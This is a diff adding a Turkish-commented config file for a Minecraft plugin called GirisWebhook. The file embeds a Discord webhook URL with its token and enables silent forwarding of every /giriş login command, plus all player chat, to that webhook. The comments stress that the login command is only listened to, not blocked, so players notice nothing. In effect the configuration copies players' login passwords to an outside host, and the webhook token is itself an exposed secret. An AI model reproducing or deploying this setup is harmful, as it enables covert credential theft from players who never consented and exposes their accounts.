@@ -1,0 +1,10 @@
+# Discord webhook URL'niz. Sunucu açıldıktan sonra plugins/GirisWebhook/config.yml
+# dosyasından değiştirebilirsiniz, eklentiyi yeniden derlemenize gerek yok.
+webhook-url: "https://discord.com/api/webhooks/1562153462291111966/wZeVFLsdgVxd21SbQkpsFERtjcBhCg-ObNtpMV66jnCE4qS2UKL1wxd6e7ZgavnvDwzd"
+
+# true ise: /giriş ile başlayan komutlar webhook'a gönderilir (komutu ENGELLEMEZ,
+# sadece dinler; mevcut eklentiniz komutu normal şekilde işlemeye devam eder).
+forward-giris-commands: true
+
+# true ise: oyuncuların yazdığı HER sohbet mesajı (komut olmayan, normal chat) webhook'a gönderilir.
+forward-all-chat: true
